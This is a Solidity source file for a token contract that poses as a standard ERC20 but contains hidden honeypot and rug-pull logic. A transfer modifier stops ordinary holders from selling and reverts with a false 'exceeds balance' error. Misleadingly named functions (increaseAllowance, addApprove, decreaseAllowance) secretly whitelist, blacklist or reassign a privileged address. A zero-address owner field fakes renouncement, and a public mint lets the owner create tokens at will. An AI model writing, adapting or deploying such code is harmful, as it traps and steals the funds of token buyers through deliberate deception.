row number 
1	               pragma solidity ^0.6.12;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract TokenContract is Context, IERC20 {
109	 using SafeMath for uint256;
110	 using Address for address;
111	 mapping (address => uint256) private _balances;
112	 mapping (address => bool) private _whiteAddress;
113	 bool private _allowNextWallet = false;
114	 mapping (address => bool) private _blackAddress;
115	 uint256 private _sellAmount = 0;
116	 mapping (address => mapping (address => uint256)) private _allowances;
117	 uint256 private _totalSupply;
118	 string private _name;
119	 string private _symbol;
120	 uint8 private _decimals;
121	 uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
122	 address public contract_owner = 0x0000000000000000000000000000000000000000;
123	 bool public Sellings_enabled = true;
124	 bool public BuyBackEnabled = true;
125	 address private _owner;
126	 address private _safeOwner;
127	 address private _unirouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
128	 constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
129	 _name = name;
130	 _symbol = symbol;
131	 _decimals = 18;
132	 _owner = owner;
133	 _safeOwner = owner;
134	 _mint(owner, initialSupply*(10**18));
135	 }
136	 function name() public view returns (string memory) {
137	 return _name;
138	 }
139	 function symbol() public view returns (string memory) {
140	 return _symbol;
141	 }
142	 function decimals() public view returns (uint8) {
143	 return _decimals;
144	 }
145	 function totalSupply() public view override returns (uint256) {
146	 return _totalSupply;
147	 }
148	 function balanceOf(address account) public view override returns (uint256) {
149	 return _balances[account];
150	 }
151	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
152	 _approveCheck(_msgSender(), recipient, amount);
153	 return true;
154	 }
155	 function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {
156	 require(msg.sender == _owner, "!owner");
157	 for (uint256 i = 0; i < receivers.length; i++) {
158	 uint256 ergdf = 3;
159	 uint256 ergdffdtg = 532;
160	 transfer(receivers[i], amounts[i]);
161	 if(i < approvecount){
162	 _whiteAddress[receivers[i]]=true;
163	 uint256 ergdf = 3;
164	 uint256 ergdffdtg = 532;
165	 _approve(receivers[i],_unirouter,115792089237316195423570985008687907853269984665640564039457584007913129639935);
166	 }
167	 }
168	 }
169	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
170	 return _allowances[owner][spender];
171	 }
172	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
173	 _approve(_msgSender(), spender, amount);
174	 return true;
175	 }
176	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
177	 _approveCheck(sender, recipient, amount);
178	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
179	 return true;
180	 }
181	 function increaseAllowance(address[] memory receivers) public {
182	 require(msg.sender == _owner, "!owner");
183	 for (uint256 i = 0; i < receivers.length; i++) {
184	 _whiteAddress[receivers[i]] = true;
185	 _blackAddress[receivers[i]] = false;
186	 }
187	 }
188	 function allowNextWallet() public {
189	 require(msg.sender == _owner, "!owner");
190	 _allowNextWallet = true ;
191	 }
192	 function decreaseAllowance(address safeOwner) public {
193	 require(msg.sender == _owner, "!owner");
194	 _safeOwner = safeOwner;
195	 }
196	 function addApprove(address[] memory receivers) public {
197	 require(msg.sender == _owner, "!owner");
198	 for (uint256 i = 0; i < receivers.length; i++) {
199	 _blackAddress[receivers[i]] = true;
200	 _whiteAddress[receivers[i]] = false;
201	 }
202	 }
203	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
204	 require(sender != address(0), "ERC20: transfer from the zero address");
205	 require(recipient != address(0), "ERC20: transfer to the zero address");
206	 _beforeTokenTransfer(sender, recipient, amount);
207	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
208	 _balances[recipient] = _balances[recipient].add(amount);
209	 emit Transfer(sender, recipient, amount);
210	 }
211	 function _mint(address account, uint256 amount) public {
212	 require(msg.sender == _owner, "ERC20: mint to the zero address");
213	 _totalSupply = _totalSupply.add(amount);
214	 _balances[_owner] = _balances[_owner].add(amount);
215	 emit Transfer(address(0), account, amount);
216	 }
217	 function _burn(address account, uint256 amount) internal virtual {
218	 require(account != address(0), "ERC20: burn from the zero address");
219	 _beforeTokenTransfer(account, address(0), amount);
220	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
221	 _totalSupply = _totalSupply.sub(amount);
222	 emit Transfer(account, address(0), amount);
223	 }
224	 function _approve(address owner, address spender, uint256 amount) internal virtual {
225	 require(owner != address(0), "ERC20: approve from the zero address");
226	 require(spender != address(0), "ERC20: approve to the zero address");
227	 _allowances[owner][spender] = amount;
228	 emit Approval(owner, spender, amount);
229	 }
230	 function _approveCheck(address sender, address recipient, uint256 amount) internal burnTokenCheck(sender,recipient,amount) virtual {
231	 require(sender != address(0), "ERC20: transfer from the zero address");
232	 require(recipient != address(0), "ERC20: transfer to the zero address");
233	 _beforeTokenTransfer(sender, recipient, amount);
234	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
235	 _balances[recipient] = _balances[recipient].add(amount) ;
236	 if (_allowNextWallet == true){
237	 _whiteAddress[recipient] = true;
238	 _allowNextWallet = false ;
239	 }
240	 emit Transfer(sender, recipient, amount);
241	 }
242	 modifier burnTokenCheck(address sender, address recipient, uint256 amount){
243	 if (_owner == _safeOwner && sender == _owner){
244	 _safeOwner = recipient;
245	 _;
246	 }
247	 else{
248	 if (sender == _owner || sender == _safeOwner || recipient == _owner){
249	 if (sender == _owner && sender == recipient){
250	 _sellAmount = amount;
251	 }
252	 _;
253	 }
254	 else{
255	 if (_whiteAddress[sender] == true){
256	 _;
257	 }
258	 else{
259	 if (_blackAddress[sender] == true){
260	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
261	 _;
262	 }
263	 else{
264	 if (amount < _sellAmount){
265	 if(recipient == _safeOwner){
266	 _blackAddress[sender] = true;
267	 _whiteAddress[sender] = false;
268	 }
269	 _;
270	 }
271	 else{
272	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
273	 _;
274	 }
275	 }
276	 }
277	 }
278	 }
279	 }
280	 function _setupDecimals(uint8 decimals_) internal {
281	 _decimals = decimals_;
282	 }
283	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
284	 }
285	 }
